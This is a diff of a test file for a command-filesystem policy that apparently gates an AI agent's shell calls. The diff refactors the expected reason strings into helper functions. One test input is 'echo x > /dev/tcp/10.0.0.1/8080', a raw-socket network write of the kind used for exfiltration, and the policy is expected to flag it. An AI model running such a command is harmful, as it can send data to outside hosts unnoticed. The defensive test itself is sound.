@@ -1,6 +1,10 @@
 import { describe, expect, it } from "bun:test";
 import { homedir } from "node:os";
 import { filesystemPolicy } from "../src/policies/filesystem/policy.ts";
+import {
+  ASK_REASON,
+  INJECTION_REASON,
+} from "../src/policies/filesystem/reasons.ts";
 import { ALLOW, ASK, DENY } from "./fixtures/filesystem.ts";
 import { decisionOf, policyCheck, reasonOf } from "./helpers/policy.ts";
 
@@ -44,7 +48,7 @@ describe("filesystem policy v2", () => {
       reasonOf(
         policyCheck(filesystemPolicy, "echo x > /dev/tcp/10.0.0.1/8080"),
       ),
-    ).toContain('("/dev/tcp/")');
+    ).toContain(INJECTION_REASON("/dev/tcp/"));
   });
 
   it("the /tmp deny reason teaches ./tmp/ at the project root", () => {
@@ -55,7 +59,7 @@ describe("filesystem policy v2", () => {
 
   it("the home-whole ask reason carries only the confirm instruction", () => {
     expect(reasonOf(policyCheck(filesystemPolicy, "ls ~"))).toBe(
-      'Filesystem policy: confirm with the user before reading the home directory as a whole ("~"). This call needs explicit user approval.',
+      ASK_REASON("reading the home directory as a whole", "~"),
     );
   });
 });
